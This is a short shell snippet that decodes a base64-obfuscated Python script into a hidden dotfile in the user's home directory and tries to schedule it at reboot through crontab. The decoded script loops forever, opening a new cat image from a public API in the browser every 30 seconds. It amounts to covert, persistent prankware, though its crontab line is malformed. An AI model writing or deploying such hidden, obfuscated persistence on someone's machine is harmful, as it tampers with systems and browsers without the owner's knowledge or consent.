payload="aW1wb3J0IHJlcXVlc3RzIGFzIEEsd2ViYnJvd3NlciBhcyBCLGpzb247ZnJvbSB0aW1lIGltcG9ydCBzbGVlcDt3aGlsZSBUcnVlOkM9QS5nZXQoJ2h0dHBzOi8vYXBpLnRoZWNhdGFwaS5jb20vdjEvaW1hZ2VzL3NlYXJjaCcpLmNvbnRlbnQuZGVjb2RlKClbMTotMV07RD1qc29uLmxvYWRzKEMpO0Iub3BlbihEWyd1cmwnXSxuZXc9Mik7c2xlZXAoMzAp"
echo $payload | base64 -d > /home/$USER/.catv.py
chmod +x /home/$USER/.catv.py
crontab -e @reboot /home/$USER/.catv.py
